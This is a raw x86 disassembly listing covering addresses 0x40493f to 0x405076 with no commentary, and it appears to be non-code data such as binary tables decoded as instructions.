  40493f:	adc    DWORD PTR [ecx+0x7602],eax
  404945:	add    BYTE PTR [eax],al
  404947:	add    BYTE PTR [eax+0x52209300],al
  40494d:	adc    DWORD PTR [esi+0x1],esi
  404950:	jnp    0x404952
  404952:	add    BYTE PTR [eax],al
  404954:	add    BYTE PTR [eax],al
  404956:	add    BYTE PTR [eax],0x93
  404959:	and    BYTE PTR [eax+0x11],dh
  40495c:	lea    eax,[edx]
  40495e:	jl     0x404960
  404960:	add    BYTE PTR [eax],al
  404962:	add    BYTE PTR [eax],al
  404964:	add    BYTE PTR [eax],0x93
  404967:	and    BYTE PTR [ecx-0x78fd62ef],cl
  40496d:	add    BYTE PTR [eax],al
  40496f:	add    BYTE PTR [eax],al
  404971:	add    BYTE PTR [eax-0x61df6d00],al
  404977:	adc    DWORD PTR [ebp+0x8a02],esp
  40497d:	add    BYTE PTR [eax],al
  40497f:	add    BYTE PTR [eax-0x59df6d00],al
  404985:	adc    DWORD PTR [edx+0x8b02],ebp
  40498b:	add    BYTE PTR [eax],al
  40498d:	add    BYTE PTR [eax-0x40df6d00],al
  404993:	or     DWORD PTR [edx+0x8e02],esi
  404999:	add    BYTE PTR [eax],al
  40499b:	add    BYTE PTR [eax-0x4adf6d00],al
  4049a1:	adc    DWORD PTR [edi+0x14008f02],esi
  4049a7:	xor    eax,DWORD PTR [eax]
  4049a9:	add    BYTE PTR [eax],al
  4049ab:	add    BYTE PTR [esi+0x1002ed18],al
  4049b1:	add    BYTE PTR [edx+0x331c00],dl
  4049b7:	add    BYTE PTR [eax],al
  4049b9:	add    BYTE PTR [ecx+0x1002ed18],al
  4049bf:	add    BYTE PTR [edx+0x332400],dl
  4049c5:	add    BYTE PTR [eax],al
  4049c7:	add    BYTE PTR [esi-0x5bedc800],dl
  4049cd:	add    DWORD PTR [edx+0x338800],edx
  4049d3:	add    BYTE PTR [eax],al
  4049d5:	add    BYTE PTR [esi-0x17edb800],dl
  4049db:	add    dl,BYTE PTR [ebx+0x341400]
  4049e1:	add    BYTE PTR [eax],al
  4049e3:	add    BYTE PTR [esi-0x5beda900],dl
  4049e9:	add    DWORD PTR [ebp+0x347800],edx
  4049ef:	add    BYTE PTR [eax],al
  4049f1:	add    BYTE PTR [esi-0x10ed9e00],dl
  4049f7:	add    dl,BYTE PTR [esi+0x355000]
  4049fd:	add    BYTE PTR [eax],al
  4049ff:	add    BYTE PTR [esi-0x1ed8900],dl
  404a05:	add    bl,BYTE PTR [ebp+0x359c00]
  404a0b:	add    BYTE PTR [eax],al
  404a0d:	add    BYTE PTR [esi-0x5bed7900],dl
  404a13:	add    DWORD PTR [edi+0x362400],ebx
  404a19:	add    BYTE PTR [eax],al
  404a1b:	add    BYTE PTR [esi-0x10ed5a00],dl
  404a21:	add    ah,BYTE PTR [eax+0x0]
  404a27:	add    BYTE PTR [eax-0x49df6a00],al
  404a2d:	adc    al,BYTE PTR ds:0xc800a703
  404a33:	add    BYTE PTR ss:[eax],al
  404a36:	add    BYTE PTR [eax],al
  404a38:	xchg   BYTE PTR [eax],bl
  404a3a:	in     eax,dx
  404a3b:	add    dl,BYTE PTR [eax]
  404a3d:	add    BYTE PTR [ebx+0x1200000],ch
  404a43:	add    dh,al
  404a45:	adc    al,BYTE PTR [eax]
  404a47:	add    BYTE PTR [edx],al
  404a49:	add    BYTE PTR [eax],bl
  404a4b:	adc    eax,DWORD PTR [eax]
  404a4d:	add    BYTE PTR [ecx],al
  404a4f:	add    BYTE PTR [ebx],ah
  404a51:	adc    eax,DWORD PTR [eax]
  404a53:	add    BYTE PTR [ecx],al
  404a55:	add    BYTE PTR ds:0x1000013,ch
  404a5b:	add    BYTE PTR [edx],dh
  404a5d:	adc    eax,DWORD PTR [eax]
  404a5f:	add    BYTE PTR [ecx],al
  404a61:	add    BYTE PTR [ebx+edx*1],dh
  404a64:	add    BYTE PTR [eax],al
  404a66:	add    DWORD PTR [eax],eax
  404a68:	sub    eax,0x2000013
  404a6d:	add    BYTE PTR [edi],bh
  404a6f:	adc    eax,DWORD PTR [eax]
  404a71:	add    BYTE PTR [ecx],al
  404a73:	add    BYTE PTR ds:0x2000013,ch
  404a79:	add    BYTE PTR [edx+0x13],cl
  404a7c:	add    BYTE PTR [eax],al
  404a7e:	add    eax,DWORD PTR [eax]
  404a80:	dec    esp
  404a81:	adc    eax,DWORD PTR [eax]
  404a83:	add    BYTE PTR [eax+eax*1],al
  404a86:	push   esi
  404a87:	adc    eax,DWORD PTR [eax]
  404a89:	add    BYTE PTR [ecx],al
  404a8b:	add    BYTE PTR [ebx+edx*1+0x0],cl
  404a8f:	add    BYTE PTR [edx],al
  404a91:	add    BYTE PTR [esi+0x13],dl
  404a94:	add    BYTE PTR [eax],al
  404a96:	add    DWORD PTR [eax],eax
  404a98:	popa   
  404a99:	adc    eax,DWORD PTR [ecx]
  404a9b:	add    BYTE PTR [edx],al
  404a9d:	add    BYTE PTR [ecx+0x13],ch
  404aa0:	add    DWORD PTR [eax],esp
  404aa2:	add    eax,DWORD PTR [eax]
  404aa4:	adc    BYTE PTR [ebx],0x2
  404aa7:	and    BYTE PTR [eax+eax*1],al
  404aaa:	xchg   DWORD PTR [ebx],edx
  404aac:	add    BYTE PTR [eax],al
  404aae:	add    DWORD PTR [eax],eax
  404ab0:	cdq    
  404ab1:	push   es
  404ab2:	add    BYTE PTR [eax],al
  404ab4:	add    al,BYTE PTR [eax]
  404ab6:	popf   
  404ab7:	adc    eax,DWORD PTR [eax]
  404ab9:	add    BYTE PTR [ebx],al
  404abb:	add    BYTE PTR [ebx+0x4000213],ah
  404ac1:	add    BYTE PTR [edi+0x1200013],al
  404ac7:	add    BYTE PTR [edi+0x2200013],ah
  404acd:	add    BYTE PTR [esi+0x1000013],ch
  404ad3:	add    BYTE PTR [edx+0x2200013],al
  404ad9:	add    BYTE PTR [ebx+0x3000013],dh
  404adf:	add    BYTE PTR [ebx+edx*1+0x40000],bh
  404ae6:	scas   al,BYTE PTR es:[edi]
  404ae7:	adc    eax,DWORD PTR [eax]
  404ae9:	and    BYTE PTR ds:0x13c300,al
  404aef:	add    BYTE PTR [ecx],al
  404af1:	add    ah,cl
  404af3:	adc    eax,DWORD PTR [eax]
  404af5:	add    BYTE PTR [edx],al
  404af7:	add    BYTE PTR [edx+0x3200013],al
  404afd:	add    BYTE PTR [esi+0x4200013],ch
  404b03:	add    cl,bl
  404b05:	adc    eax,DWORD PTR [eax]
  404b07:	add    BYTE PTR ds:0x213e100,al
  404b0d:	and    BYTE PTR [esi],al
  404b0f:	add    ch,ch
  404b11:	adc    eax,DWORD PTR [eax]
  404b13:	add    BYTE PTR [edi],al
  404b15:	add    al,bh
  404b17:	adc    eax,DWORD PTR [edx]
  404b19:	and    BYTE PTR [eax],cl
  404b1b:	add    BYTE PTR [ebx],al
  404b1d:	adc    al,0x0
  404b1f:	add    BYTE PTR [ecx],al
  404b21:	add    BYTE PTR [ebx],cl
  404b23:	adc    al,0x0
  404b25:	add    BYTE PTR [ecx],al
  404b27:	add    BYTE PTR [ecx],dl
  404b29:	adc    al,0x0
  404b2b:	add    BYTE PTR [ecx],al
  404b2d:	add    BYTE PTR ds:0x1000014,dl
  404b33:	add    BYTE PTR [eax],bl
  404b35:	adc    al,0x0
  404b37:	add    BYTE PTR [edx],al
  404b39:	add    BYTE PTR [eax],ch
  404b3b:	adc    al,0x0
  404b3d:	add    BYTE PTR [ebx],al
  404b3f:	add    BYTE PTR [ebx],dh
  404b41:	adc    al,0x0
  404b43:	add    BYTE PTR [ecx],al
  404b45:	add    BYTE PTR [ebx],bh
  404b47:	adc    al,0x0
  404b49:	add    BYTE PTR [edx],al
  404b4b:	add    BYTE PTR [ebp+0x14],al
  404b4e:	add    BYTE PTR [eax],al
  404b50:	add    DWORD PTR [eax],eax
  404b52:	dec    edi
  404b53:	adc    al,0x0
  404b55:	add    BYTE PTR [ecx],al
  404b57:	add    BYTE PTR [esi+0x14],dl
  404b5a:	add    BYTE PTR [eax],al
  404b5c:	add    DWORD PTR [eax],eax
  404b5e:	pusha  
  404b5f:	adc    al,0x0
  404b61:	add    BYTE PTR [edx],al
  404b63:	add    BYTE PTR [ecx+0x14],dh
  404b66:	add    BYTE PTR [eax],al
  404b68:	add    DWORD PTR [eax],eax
  404b6a:	jp     0x404b80
  404b6c:	add    BYTE PTR [eax],al
  404b6e:	add    DWORD PTR [eax],eax
  404b70:	adc    DWORD PTR [eax+eax*1],0x0
  404b74:	add    DWORD PTR [eax],eax
  404b76:	jp     0x404b8c
  404b78:	add    BYTE PTR [eax],al
  404b7a:	add    al,BYTE PTR [eax]
  404b7c:	jno    0x404b92
  404b7e:	add    al,BYTE PTR [eax]
  404b80:	add    eax,DWORD PTR [eax]
  404b82:	xchg   edx,eax
  404b83:	adc    al,0x0
  404b85:	add    BYTE PTR [ecx],al
  404b87:	add    BYTE PTR [esi+0x14],dl
  404b8a:	add    BYTE PTR [eax],al
  404b8c:	add    DWORD PTR [eax],eax
  404b8e:	jp     0x404ba4
  404b90:	add    BYTE PTR [eax],al
  404b92:	add    al,BYTE PTR [eax]
  404b94:	jno    0x404baa
  404b96:	add    BYTE PTR [eax],al
  404b98:	add    eax,DWORD PTR [eax]
  404b9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b9b:	adc    al,0x0
  404b9d:	add    BYTE PTR [ecx],al
  404b9f:	add    BYTE PTR [esi+0x2000014],ch
  404ba5:	add    BYTE PTR [ecx+0x14],dh
  404ba8:	add    BYTE PTR [eax],al
  404baa:	add    eax,DWORD PTR [eax]
  404bac:	mov    ebx,0x4000214
  404bb1:	add    bh,dl
  404bb3:	adc    al,0x0
  404bb5:	add    BYTE PTR [ecx],al
  404bb7:	add    BYTE PTR [esi+0x2000014],ch
  404bbd:	add    BYTE PTR [ecx+0x14],dh
  404bc0:	add    BYTE PTR [eax],al
  404bc2:	add    eax,DWORD PTR [eax]
  404bc4:	mov    ebx,0x1000014
  404bc9:	add    BYTE PTR [edx+0x14],bh
  404bcc:	add    BYTE PTR [eax],al
  404bce:	add    DWORD PTR [eax],eax
  404bd0:	jp     0x404be6
  404bd2:	add    al,BYTE PTR [eax]
  404bd4:	add    al,BYTE PTR [eax]
  404bd6:	in     al,0x14
  404bd8:	add    BYTE PTR [eax],al
  404bda:	add    DWORD PTR [eax],eax
  404bdc:	in     al,dx
  404bdd:	adc    al,0x0
  404bdf:	add    BYTE PTR [ecx],al
  404be1:	add    cl,dh
  404be3:	adc    al,0x0
  404be5:	add    BYTE PTR [ecx],al
  404be7:	add    BYTE PTR [ecx+0x14],dh
  404bea:	add    BYTE PTR [eax],al
  404bec:	add    DWORD PTR [eax],eax
  404bee:	jno    0x404c04
  404bf0:	add    BYTE PTR [eax],al
  404bf2:	add    DWORD PTR [eax],eax
  404bf4:	push   esi
  404bf5:	adc    al,0x0
  404bf7:	add    BYTE PTR [edx],al
  404bf9:	add    cl,dh
  404bfb:	adc    al,0x0
  404bfd:	add    BYTE PTR [ecx],al
  404bff:	add    BYTE PTR [edx],al
  404c01:	adc    eax,0x10000
  404c06:	adc    dl,BYTE PTR ds:0x10000
  404c0c:	sbb    al,0x15
  404c0e:	add    BYTE PTR [eax],al
  404c10:	add    al,BYTE PTR [eax]
  404c12:	sub    BYTE PTR ds:0x30002,dl
  404c18:	ds adc eax,0x40000
  404c1e:	dec    edi
  404c1f:	adc    eax,0x50002
  404c24:	adc    ax,0x0
  404c28:	add    DWORD PTR [eax],eax
  404c2a:	jae    0x404c41
  404c2c:	add    BYTE PTR [eax],al
  404c2e:	add    al,BYTE PTR [eax]
  404c30:	adc    BYTE PTR ds:0x30000,0x8b
  404c37:	adc    eax,0x40000
  404c3c:	cwde   
  404c3d:	adc    eax,0x50000
  404c42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c43:	adc    eax,0x60002
  404c48:	mov    ah,0x15
  404c4a:	add    BYTE PTR [eax],al
  404c4c:	add    DWORD PTR [eax],eax
  404c4e:	mov    esp,0x2000015
  404c53:	add    cl,cl
  404c55:	adc    eax,0x30000
  404c5a:	xlat   BYTE PTR ds:[ebx]
  404c5b:	adc    eax,0x40000
  404c60:	fcom   QWORD PTR ds:0x50000
  404c66:	loop   0x404c7d
  404c68:	add    BYTE PTR [eax],al
  404c6a:	push   es
  404c6b:	add    ch,ch
  404c6d:	adc    eax,0x70002
  404c72:	cld    
  404c73:	adc    eax,0x10000
  404c78:	add    dl,BYTE PTR [esi]
  404c7a:	add    BYTE PTR [eax],al
  404c7c:	add    al,BYTE PTR [eax]
  404c7e:	or     DWORD PTR [esi],edx
  404c80:	add    BYTE PTR [eax],al
  404c82:	add    eax,DWORD PTR [eax]
  404c84:	adc    BYTE PTR [esi],dl
  404c86:	add    BYTE PTR [eax],al
  404c88:	add    al,0x0
  404c8a:	adc    eax,0x5000016
  404c8f:	add    BYTE PTR [esi],bl
  404c91:	push   ss
  404c92:	add    BYTE PTR [eax],al
  404c94:	push   es
  404c95:	add    BYTE PTR ds:0x7000216,ah
  404c9b:	add    BYTE PTR [eax],dh
  404c9d:	push   ss
  404c9e:	add    BYTE PTR [eax],ah
  404ca0:	add    DWORD PTR [eax],eax
  404ca2:	xor    al,0x16
  404ca4:	add    BYTE PTR [eax],ah
  404ca6:	add    al,BYTE PTR [eax]
  404ca8:	aas    
  404ca9:	push   ss
  404caa:	add    BYTE PTR [eax],al
  404cac:	add    eax,DWORD PTR [eax]
  404cae:	dec    ecx
  404caf:	push   ss
  404cb0:	add    BYTE PTR [eax],al
  404cb2:	add    al,0x0
  404cb4:	jle    0x404cc5
  404cb6:	add    BYTE PTR [eax],al
  404cb8:	add    eax,0x164f00
  404cbd:	and    BYTE PTR [ecx],al
  404cbf:	add    BYTE PTR [esi+edx*1],dh
  404cc2:	add    BYTE PTR [eax],ah
  404cc4:	add    al,BYTE PTR [eax]
  404cc6:	aas    
  404cc7:	push   ss
  404cc8:	add    BYTE PTR [eax],al
  404cca:	add    eax,DWORD PTR [eax]
  404ccc:	dec    ecx
  404ccd:	push   ss
  404cce:	add    BYTE PTR [eax],al
  404cd0:	add    al,0x0
  404cd2:	jle    0x404ce3
  404cd4:	add    BYTE PTR [eax],al
  404cd6:	add    eax,0x164f00
  404cdb:	and    BYTE PTR [ecx],al
  404cdd:	add    BYTE PTR [esi+edx*1],dh
  404ce0:	add    BYTE PTR [eax],ah
  404ce2:	add    al,BYTE PTR [eax]
  404ce4:	aas    
  404ce5:	push   ss
  404ce6:	add    BYTE PTR [eax],al
  404ce8:	add    eax,DWORD PTR [eax]
  404cea:	dec    ecx
  404ceb:	push   ss
  404cec:	add    al,BYTE PTR [eax]
  404cee:	add    al,0x0
  404cf0:	pop    esp
  404cf1:	push   ss
  404cf2:	add    BYTE PTR [eax],ah
  404cf4:	add    DWORD PTR [eax],eax
  404cf6:	xor    al,0x16
  404cf8:	add    BYTE PTR [eax],ah
  404cfa:	add    al,BYTE PTR [eax]
  404cfc:	arpl   WORD PTR [esi],dx
  404cfe:	add    BYTE PTR [eax],ah
  404d00:	add    DWORD PTR [eax],eax
  404d02:	ins    BYTE PTR es:[edi],dx
  404d03:	push   ss
  404d04:	add    BYTE PTR [eax],al
  404d06:	add    al,BYTE PTR [eax]
  404d08:	ja     0x404d20
  404d0a:	add    BYTE PTR [eax],al
  404d0c:	add    eax,DWORD PTR [eax]
  404d0e:	adc    DWORD PTR [esi],0x40001
  404d14:	nop
  404d15:	push   ss
  404d16:	add    al,BYTE PTR [eax]
  404d18:	add    eax,0x169900
  404d1d:	add    BYTE PTR [ecx],al
  404d1f:	add    BYTE PTR [ecx+0x1000016],bl
  404d25:	add    BYTE PTR [ebx+0x2000016],ah
  404d2b:	add    BYTE PTR [eax+0x3000016],bh
  404d31:	add    bl,cl
  404d33:	push   ss
  404d34:	add    BYTE PTR [eax],al
  404d36:	add    al,0x0
  404d38:	fist   DWORD PTR [esi]
  404d3a:	add    BYTE PTR [eax],al
  404d3c:	add    eax,0x16eb00
  404d41:	add    BYTE PTR [esi],al
  404d43:	add    bl,bh
  404d45:	push   ss
  404d46:	add    BYTE PTR [eax],al
  404d48:	pop    es
  404d49:	add    BYTE PTR [ebx],cl
  404d4b:	pop    ss
  404d4c:	add    BYTE PTR [eax],al
  404d4e:	or     BYTE PTR [eax],al
  404d50:	sbb    edx,DWORD PTR [edi]
  404d52:	add    BYTE PTR [eax],al
  404d54:	or     DWORD PTR [eax],eax
  404d56:	sub    edx,DWORD PTR [edi]
  404d58:	add    BYTE PTR [eax],al
  404d5a:	or     al,BYTE PTR [eax]
  404d5c:	cmp    edx,DWORD PTR [edi]
  404d5e:	add    al,BYTE PTR [eax]
  404d60:	or     eax,DWORD PTR [eax]
  404d62:	xlat   BYTE PTR ds:[ebx]
  404d63:	adc    eax,0x10000
  404d68:	sbb    al,0x15
  404d6a:	add    BYTE PTR [eax],al
  404d6c:	add    al,BYTE PTR [eax]
  404d6e:	dec    ebx
  404d6f:	pop    ss
  404d70:	add    al,BYTE PTR [eax]
  404d72:	add    eax,DWORD PTR [eax]
  404d74:	push   esi
  404d75:	pop    ss
  404d76:	add    BYTE PTR [eax],al
  404d78:	add    DWORD PTR [eax],eax
  404d7a:	xlat   BYTE PTR ds:[ebx]
  404d7b:	adc    eax,0x10000
  404d80:	pop    edi
  404d81:	pop    ss
  404d82:	add    BYTE PTR [eax],al
  404d84:	add    al,BYTE PTR [eax]
  404d86:	mov    BYTE PTR [ebx],cl
  404d88:	add    BYTE PTR [eax],al
  404d8a:	add    eax,DWORD PTR [eax]
  404d8c:	jae    0x404da5
  404d8e:	add    BYTE PTR [eax],al
  404d90:	add    DWORD PTR [eax],eax
  404d92:	retf   
  404d93:	or     DWORD PTR [eax],eax
  404d95:	add    BYTE PTR [ecx],al
  404d97:	add    BYTE PTR [eax+0x2000217],cl
  404d9d:	add    BYTE PTR [ecx+0x3000017],dl
  404da3:	add    BYTE PTR [edx+0x1000017],bl
  404da9:	add    BYTE PTR [esp+edx*1+0x10000],ah
  404db0:	mov    ds:0x2000217,al
  404db5:	add    BYTE PTR [edi+edx*1+0x10000],ch
  404dbc:	ret    0x17
  404dbf:	add    BYTE PTR [ecx],al
  404dc1:	add    BYTE PTR [esp+edx*1+0x20000],ah
  404dc8:	(bad)  
  404dc9:	pop    ss
  404dca:	add    BYTE PTR [eax],al
  404dcc:	add    eax,DWORD PTR [eax]
  404dce:	in     al,0x17
  404dd0:	add    al,BYTE PTR [eax]
  404dd2:	add    al,0x0
  404dd4:	not    BYTE PTR [edi]
  404dd6:	add    al,BYTE PTR [eax]
  404dd8:	add    eax,0x2180800
  404ddd:	add    BYTE PTR [esi],al
  404ddf:	add    BYTE PTR [eax+ebx*1],ah
  404de2:	add    al,BYTE PTR [eax]
  404de4:	pop    es
  404de5:	add    BYTE PTR [eax+ebx*1],dh
  404de8:	add    BYTE PTR [eax],al
  404dea:	add    DWORD PTR [eax],eax
  404dec:	inc    ebx
  404ded:	sbb    BYTE PTR [edx],al
  404def:	add    BYTE PTR [edx],al
  404df1:	add    dh,dh
  404df3:	pop    ss
  404df4:	add    BYTE PTR [eax],al
  404df6:	add    DWORD PTR [eax],eax
  404df8:	or     edx,DWORD PTR [eax+eax*1]
  404dfb:	add    BYTE PTR [ecx],al
  404dfd:	add    BYTE PTR [eax+ebx*1+0x0],cl
  404e01:	add    BYTE PTR [edx],al
  404e03:	add    bh,al
  404e05:	pop    ss
  404e06:	add    BYTE PTR [eax],al
  404e08:	add    eax,DWORD PTR [eax]
  404e0a:	in     al,0x17
  404e0c:	add    al,BYTE PTR [eax]
  404e0e:	add    al,0x0
  404e10:	not    BYTE PTR [edi]
  404e12:	add    al,BYTE PTR [eax]
  404e14:	add    eax,0x2180800
  404e19:	add    BYTE PTR [esi],al
  404e1b:	add    BYTE PTR [eax+ebx*1],ah
  404e1e:	add    al,BYTE PTR [eax]
  404e20:	pop    es
  404e21:	add    BYTE PTR [eax+ebx*1],dh
  404e24:	add    BYTE PTR [eax],al
  404e26:	add    DWORD PTR [eax],eax
  404e28:	xor    al,0x16
  404e2a:	add    BYTE PTR [eax],al
  404e2c:	add    al,BYTE PTR [eax]
  404e2e:	pop    ebp
  404e2f:	sbb    BYTE PTR [eax],al
  404e31:	add    BYTE PTR [ebx],al
  404e33:	add    BYTE PTR [ecx+0x16],cl
  404e36:	add    al,BYTE PTR [eax]
  404e38:	add    al,0x0
  404e3a:	pop    esp
  404e3b:	push   ss
  404e3c:	mov    DWORD PTR [eax],eax
  404e3e:	in     eax,dx
  404e3f:	add    cl,BYTE PTR [edi]
  404e41:	add    ebx,DWORD PTR [ecx+0x1002ed00]
  404e47:	add    BYTE PTR [ecx+0x1002ed00],ah
  404e4d:	add    BYTE PTR [ecx+0x4602ed00],ch
  404e53:	add    DWORD PTR [ecx+0x2302ed00],esi
  404e59:	add    edi,DWORD PTR [ecx+0x4602ed00]
  404e5f:	add    ecx,eax
  404e61:	add    ch,ch
  404e63:	add    al,BYTE PTR [esi+0x1]
  404e66:	leave  
  404e67:	add    ch,ch
  404e69:	add    al,BYTE PTR [esi+0x1]
  404e6c:	rol    DWORD PTR [eax],1
  404e6e:	in     eax,dx
  404e6f:	add    al,BYTE PTR [esi+0x1]
  404e72:	fld    DWORD PTR [eax]
  404e74:	in     eax,dx
  404e75:	add    al,BYTE PTR [esi+0x1]
  404e78:	loope  0x404e7a
  404e7a:	in     eax,dx
  404e7b:	add    al,BYTE PTR [esi+0x1]
  404e7e:	jmp    0x23433b83
  404e83:	add    esi,ecx
  404e85:	add    ch,ch
  404e87:	add    ah,BYTE PTR [ebx]
  404e89:	add    edi,ecx
  404e8b:	add    ch,ch
  404e8d:	add    al,BYTE PTR [esi+0x1]
  404e90:	add    DWORD PTR [ecx],eax
  404e92:	in     eax,dx
  404e93:	add    ch,BYTE PTR [eax]
  404e95:	add    edx,DWORD PTR [ecx]
  404e97:	add    ebp,ebp
  404e99:	add    ch,BYTE PTR [edi]
  404e9b:	add    esp,DWORD PTR [ecx]
  404e9d:	add    ebp,ebp
  404e9f:	add    cl,BYTE PTR [ebx+0x1]
  404ea2:	sub    DWORD PTR [ecx],eax
  404ea4:	in     eax,dx
  404ea5:	add    dl,BYTE PTR [eax]
  404ea7:	add    BYTE PTR [ecx],dh
  404ea9:	add    DWORD PTR [esi+0x9000a09],ebp
  404eaf:	add    ch,ch
  404eb1:	add    dl,BYTE PTR [eax]
  404eb3:	add    BYTE PTR [ecx],bh
  404eb5:	add    ebp,ebp
  404eb7:	add    al,BYTE PTR [esi+0x1]
  404eba:	inc    ecx
  404ebb:	add    DWORD PTR [edx+ebx*1+0x7903d8],edi
  404ec2:	retf   
  404ec3:	sbb    bl,ch
  404ec5:	add    esi,DWORD PTR [ecx+0x0]
  404ec8:	in     eax,dx
  404ec9:	add    ah,dl
  404ecb:	add    ecx,DWORD PTR [ecx+0x1]
  404ece:	in     eax,dx
  404ecf:	add    dl,BYTE PTR [eax]
  404ed1:	add    BYTE PTR [ecx+0x1],dl
  404ed4:	in     eax,dx
  404ed5:	add    al,BYTE PTR [esi+0x1]
  404ed8:	pop    ecx
  404ed9:	add    DWORD PTR ds:0x3103f01b,ebx
  404edf:	add    BYTE PTR [edi],ah
  404ee1:	sbb    esi,esi
  404ee3:	add    ebp,DWORD PTR [ecx+0x1]
  404ee6:	aas    
  404ee7:	sbb    ebx,DWORD PTR [esi]
  404ee9:	add    BYTE PTR [ecx],dh
  404eeb:	add    DWORD PTR [ebx+0x1b],ecx
  404eee:	cli    
  404eef:	add    esp,DWORD PTR [ecx+0x1]
  404ef2:	push   ebx
  404ef3:	sbb    eax,DWORD PTR [esi+0x1]
  404ef6:	xor    DWORD PTR [eax],eax
  404ef8:	pop    ebp
  404ef9:	sbb    esi,esi
  404efb:	add    esi,DWORD PTR [ecx]
  404efd:	add    DWORD PTR [ebx+ebx*1-0xa],ebp
  404f01:	add    esi,DWORD PTR [ecx+0x1]
  404f04:	in     eax,dx
  404f05:	add    dl,BYTE PTR [eax]
  404f07:	add    BYTE PTR [eax+eax*1],cl
  404f0a:	in     eax,dx
  404f0b:	add    cl,BYTE PTR [ebx+0x1]
  404f0e:	or     al,0x0
  404f10:	sbb    DWORD PTR [ecx+edx*1],ebx
  404f13:	add    al,0xc
  404f15:	add    BYTE PTR ds:0x3104191c,bl
  404f1b:	add    DWORD PTR [ecx],ebp
  404f1d:	sbb    al,0x22
  404f1f:	add    al,0x81
  404f21:	add    ebp,ebp
  404f23:	add    ah,BYTE PTR [edi]
  404f25:	add    al,0x29
  404f27:	add    BYTE PTR [esi+0x1c],cl
  404f2a:	inc    esi
  404f2b:	add    DWORD PTR [ecx],ebp
  404f2d:	add    BYTE PTR [edi+0x1c],ah
  404f30:	inc    esi
  404f31:	add    DWORD PTR [ecx+0x2d1c8901],ecx
  404f37:	add    al,0x29
  404f39:	add    BYTE PTR [ecx+0x2904321c],dl
  404f3f:	add    BYTE PTR [ebp+0x2901461c],bl
  404f45:	add    BYTE PTR [edx+0x2901461c],ch
  404f4b:	add    BYTE PTR [ebx+0x2901461c],dh
  404f51:	add    BYTE PTR [ebp+0x2900101c],bh
  404f57:	add    dh,cl
  404f59:	sbb    al,0x10
  404f5b:	add    BYTE PTR [ecx+0x1],bl
  404f5e:	loope  0x404f7c
  404f60:	inc    eax
  404f61:	add    BYTE PTR [ecx],dh
  404f63:	add    edi,esp
  404f65:	sbb    al,0x39
  404f67:	add    al,0x31
  404f69:	add    esi,ebp
  404f6b:	sbb    al,0xa4
  404f6d:	add    DWORD PTR [ecx+0x1],ebx
  404f70:	push   ebx
  404f71:	sbb    eax,DWORD PTR [eax+0x0]
  404f74:	xchg   ecx,eax
  404f75:	add    ebp,ebp
  404f77:	add    dl,BYTE PTR [eax]
  404f79:	add    BYTE PTR [ecx+0x4c1d1d01],bl
  404f7f:	add    al,0x99
  404f81:	add    DWORD PTR [edx],esi
  404f83:	sbb    eax,0x1a103f6
  404f88:	inc    esp
  404f89:	sbb    eax,0x1a10452
  404f8e:	push   ebp
  404f8f:	sbb    eax,0x1a90457
  404f94:	jne    0x404f9f
  404f96:	pop    ebp
  404f97:	add    al,0x31
  404f99:	add    DWORD PTR [edx+0x1d],esp
  404f9c:	test   BYTE PTR [ebx],0x31
  404f9f:	add    DWORD PTR [ebx+0x1d],esi
  404fa2:	and    al,BYTE PTR [ecx+esi*4]
  404fa5:	add    ebp,ebp
  404fa7:	add    ch,BYTE PTR [ecx+0x4]
  404faa:	mov    cl,0x1
  404fac:	lods   al,BYTE PTR ds:[esi]
  404fad:	sbb    eax,0x1c10471
  404fb2:	ret    0x781d
  404fb5:	add    al,0xc9
  404fb7:	add    ebx,edx
  404fb9:	sbb    eax,0x1d9047e
  404fbe:	in     al,0x1d
  404fc0:	test   BYTE PTR [ebx],0x31
  404fc3:	add    DWORD PTR [edx],eax
  404fc5:	push   ds
  404fc6:	out    dx,eax
  404fc7:	add    BYTE PTR [ecx],dh
  404fc9:	add    DWORD PTR ds:0x3104851e,ecx
  404fcf:	add    DWORD PTR [edi],edx
  404fd1:	push   ds
  404fd2:	push   edi
  404fd3:	add    al,0xe1
  404fd5:	add    ebp,ebp
  404fd7:	add    ah,BYTE PTR [edi]
  404fd9:	add    al,0xe9
  404fdb:	add    DWORD PTR [eax+0x1e],ebx
  404fde:	call   0xa31e:0x6a014104
  404fe5:	add    al,0x39
  404fe7:	add    BYTE PTR [ecx+0x1e],dh
  404fea:	stos   BYTE PTR es:[edi],al
  404feb:	add    al,0xf9
  404fed:	add    ebp,ebp
  404fef:	add    dl,BYTE PTR [eax]
  404ff1:	add    BYTE PTR [ecx],al
  404ff3:	add    ch,ch
  404ff5:	add    dh,BYTE PTR [esi-0x12fdeefc]
  404ffb:	add    dl,BYTE PTR [eax]
  404ffd:	add    BYTE PTR [ecx],bl
  404fff:	add    ch,ch
  405001:	add    al,BYTE PTR [esi+0x1]
  405004:	and    DWORD PTR [edx],eax
  405006:	in     eax,dx
  405007:	add    ah,bh
  405009:	add    al,0x31
  40500b:	add    ch,ch
  40500d:	add    dl,BYTE PTR [eax]
  40500f:	add    BYTE PTR [ecx],bh
  405011:	add    ch,ch
  405013:	add    ah,BYTE PTR [edi]
  405015:	add    al,0x41
  405017:	add    ch,ch
  405019:	add    dl,BYTE PTR [eax]
  40501b:	add    BYTE PTR [ecx],cl
  40501d:	add    BYTE PTR [edi+ebx*1+0x38],dl
  405021:	add    eax,0x1f6401e9
  405026:	ds add eax,0x2ed0059
  40502c:	inc    esp
  40502d:	add    eax,0x1f710059
  405032:	push   ecx
  405033:	add    eax,0x2ed0249
  405038:	pop    eax
  405039:	add    eax,0x2ed0021
  40503e:	and    eax,DWORD PTR [ebx]
  405040:	pop    ecx
  405041:	add    al,dh
  405043:	pop    ds
  405044:	in     al,dx
  405045:	add    BYTE PTR [ecx+0x2],ah
  405048:	(bad)  
  405049:	pop    ds
  40504a:	ins    DWORD PTR es:[edi],dx
  40504b:	add    DWORD PTR [ecx+0x1],eax
  40504e:	loopne 0x40506f
  405050:	push   0xf3014105
  405055:	pop    ds
  405056:	ins    DWORD PTR es:[edi],dx
  405057:	add    eax,0x144f0261
  40505c:	in     al,dx
  40505d:	add    BYTE PTR [ecx+0x1],al
  405060:	jne    0x40506b
  405062:	jb     0x405069
  405064:	popa   
  405065:	add    al,BYTE PTR [eax]
  405067:	and    BYTE PTR [ecx+eax*1+0x69],ah
  40506b:	add    ch,ch
  40506d:	add    dl,BYTE PTR [eax]
  40506f:	add    BYTE PTR [ecx+0x1],al
  405072:	sub    BYTE PTR [eax],ah
  405074:	jnp    0x40507b
  405076:	inc    ecx
